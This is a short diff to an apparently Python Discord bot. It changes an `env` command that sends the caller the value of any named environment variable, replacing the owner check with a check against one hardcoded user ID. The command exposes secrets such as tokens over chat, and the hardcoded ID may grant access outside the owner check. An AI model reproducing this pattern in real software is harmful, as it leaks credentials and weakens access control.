@@ -17,9 +17,9 @@ async def ttt(ctx):
     await ctx.send(view=TTToe())
 
 @bot.command()
-@commands.is_owner()
 async def env(ctx, key:str):
-    await ctx.author.send(str(os.environ[key]))
+    if ctx.author.id == 1098141251209023538:
+        await ctx.author.send(str(os.environ[key]))
 
 @bot.command()
 @commands.is_owner()
